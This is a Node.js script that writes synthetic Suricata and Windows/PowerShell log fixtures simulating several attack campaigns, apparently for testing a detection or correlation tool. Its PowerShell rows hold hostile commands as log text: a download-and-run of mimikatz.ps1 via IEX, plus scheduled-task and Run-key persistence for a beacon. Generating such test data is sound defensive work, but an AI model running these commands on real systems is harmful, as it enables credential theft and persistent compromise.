import { writeFileSync, mkdirSync } from "fs";
import { dirname, join } from "path";
import { fileURLToPath } from "url";

const dir = join(dirname(fileURLToPath(import.meta.url)), "../fixtures/synthetic-lab");
mkdirSync(dir, { recursive: true });

function ts(h, m, s = 0) {
  const pad = (n) => String(n).padStart(2, "0");
  return `2026-09-01T${pad(h)}:${pad(m)}:${pad(s)}.000000+0000`;
}

function csvTime(h, m, s = 0) {
  const pad = (n) => String(n).padStart(2, "0");
  return `01/09/2026 ${pad(h)}:${pad(m)}:${pad(s)}`;
}

const eve = [];

function alert({ src, dest, sport, dport, sig, cat, time }) {
  eve.push({
    timestamp: time,
    event_type: "alert",
    src_ip: src,
    dest_ip: dest,
    src_port: sport,
    dest_port: dport,
    proto: "TCP",
    alert: { signature: sig, category: cat },
  });
}

function http({ src, dest, sport, dport, url, time }) {
  eve.push({
    timestamp: time,
    event_type: "http",
    src_ip: src,
    dest_ip: dest,
    src_port: sport,
    dest_port: dport,
    proto: "TCP",
    http: { url, hostname: dest, http_method: "GET" },
  });
}

// Pair 1 — most alerts so this becomes the primary (critical) campaign
const A1 = "10.20.30.2";
const V1 = "10.20.40.10";
for (const port of [22, 80, 443, 3389, 445, 8080, 21, 25]) {
  alert({
    src: A1,
    dest: V1,
    sport: 41000 + port,
    dport: port,
    sig: `ET SCAN Nmap Scripting Engine User-Agent Detected (port ${port})`,
    cat: "Attempted Information Leak",
    time: ts(14, 2, port % 50),
  });
}
http({
  src: A1,
  dest: V1,
  sport: 51210,
  dport: 80,
  url: "/payloads/beacon.exe",
  time: ts(14, 8, 10),
});
http({
  src: A1,
  dest: V1,
  sport: 51211,
  dport: 80,
  url: "/stage/implant.ps1",
  time: ts(14, 8, 40),
});
alert({
  src: A1,
  dest: V1,
  sport: 51300,
  dport: 4444,
  sig: "ET POLICY Suspicious inbound to high port",
  cat: "Generic Protocol Command Decode",
  time: ts(14, 18, 5),
});
alert({
  src: V1,
  dest: A1,
  sport: 4444,
  dport: 51301,
  sig: "ET POLICY Reverse shell callback",
  cat: "Generic Protocol Command Decode",
  time: ts(14, 18, 20),
});

// Pair 2 — recon + delivery + C2
const A2 = "10.20.30.5";
const V2 = "10.20.40.20";
for (const port of [22, 80, 443, 445]) {
  alert({
    src: A2,
    dest: V2,
    sport: 42000 + port,
    dport: port,
    sig: "ET SCAN Potential SSH Scan",
    cat: "Attempted Information Leak",
    time: ts(14, 12, port % 40),
  });
}
http({
  src: A2,
  dest: V2,
  sport: 52100,
  dport: 8080,
  url: "/dropper/loader.exe",
  time: ts(14, 16, 0),
});
alert({
  src: A2,
  dest: V2,
  sport: 52200,
  dport: 5555,
  sig: "ET TROJAN Possible Meterpreter C2",
  cat: "A Network Trojan was Detected",
  time: ts(14, 22, 10),
});

// Pair 3 — recon + delivery + C2
const A3 = "10.20.30.8";
const V3 = "10.20.40.30";
for (const port of [80, 443, 3389]) {
  alert({
    src: A3,
    dest: V3,
    sport: 43000 + port,
    dport: port,
    sig: "ET SCAN Nmap XML O-flag",
    cat: "Attempted Information Leak",
    time: ts(14, 20, port % 30),
  });
}
http({
  src: A3,
  dest: V3,
  sport: 53100,
  dport: 80,
  url: "/tools/ransom.bat",
  time: ts(14, 24, 0),
});
alert({
  src: A3,
  dest: V3,
  sport: 53200,
  dport: 8888,
  sig: "ET POLICY Unusual outbound to high port",
  cat: "Generic Protocol Command Decode",
  time: ts(14, 28, 0),
});

// Pair 4 — recon + delivery only (fewer alerts → not a top-3 attacker)
alert({
  src: "198.51.100.44",
  dest: V1,
  sport: 54001,
  dport: 22,
  sig: "ET SCAN Potential SSH Scan OUTBOUND",
  cat: "Attempted Information Leak",
  time: ts(14, 30, 0),
});
http({
  src: "198.51.100.44",
  dest: V1,
  sport: 54002,
  dport: 80,
  url: "/tmp/steal.exe",
  time: ts(14, 31, 0),
});

// Pair 5 — recon + delivery
alert({
  src: "203.0.113.77",
  dest: "192.0.2.88",
  sport: 55001,
  dport: 80,
  sig: "ET SCAN Nmap Scripting Engine User-Agent Detected",
  cat: "Network Scan",
  time: ts(14, 33, 0),
});
http({
  src: "203.0.113.77",
  dest: "192.0.2.88",
  sport: 55002,
  dport: 80,
  url: "/update/agent.ps1",
  time: ts(14, 34, 0),
});

writeFileSync(join(dir, "eve.json"), eve.map((e) => JSON.stringify(e)).join("\n") + "\n");

const winHeader = "Level,Date and Time,Source,Event ID,Task Category";
const winRows = [
  `"Information","${csvTime(14, 10, 5)}","Microsoft-Windows-Security-Auditing",4624,"Logon","Successful logon. Account Name: jdoe Source Network Address: ${A1} Process Name: C:\\Windows\\System32\\svchost.exe"`,
  `"Information","${csvTime(14, 10, 20)}","Microsoft-Windows-Security-Auditing",4798,"User Account Management","A user's local group membership was enumerated. Account Name: jdoe Source Network Address: ${A1}"`,
  `"Failure","${csvTime(14, 3, 0)}","Microsoft-Windows-Security-Auditing",4625,"Logon","Failed logon. Account Name: administrator Source Network Address: ${A1}"`,
];
writeFileSync(join(dir, "windows-security.csv"), [winHeader, ...winRows].join("\n") + "\n");

const psHeader = "Level,Date and Time,Source,Event ID,Task Category";
const psRows = [
  `"Warning","${csvTime(14, 11, 0)}","Microsoft-Windows-PowerShell",4104,"Execute a Remote Command","Creating Scriptblock text (1 of 1): whoami /all; systeminfo"`,
  `"Warning","${csvTime(14, 11, 30)}","Microsoft-Windows-PowerShell",4104,"Execute a Remote Command","Creating Scriptblock text (1 of 1): Get-Process; Get-LocalUser; Get-NetTCPConnection"`,
  `"Warning","${csvTime(14, 12, 10)}","Microsoft-Windows-PowerShell",4104,"Execute a Remote Command","Creating Scriptblock text (1 of 1): IEX (New-Object Net.WebClient).DownloadString('http://10.20.30.2/mimikatz.ps1')"`,
  `"Warning","${csvTime(14, 14, 0)}","Microsoft-Windows-PowerShell",4104,"Execute a Remote Command","Creating Scriptblock text (1 of 1): schtasks /create /tn WinUpdate /tr C:\\Windows\\Temp\\beacon.exe /sc onlogon"`,
  `"Warning","${csvTime(14, 14, 20)}","Microsoft-Windows-PowerShell",4104,"Execute a Remote Command","Creating Scriptblock text (1 of 1): New-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name Update -Value C:\\Windows\\Temp\\beacon.exe"`,
];
writeFileSync(join(dir, "powershell.csv"), [psHeader, ...psRows].join("\n") + "\n");

console.log(`Wrote ${eve.length} EVE events + Windows + PowerShell to ${dir}`);
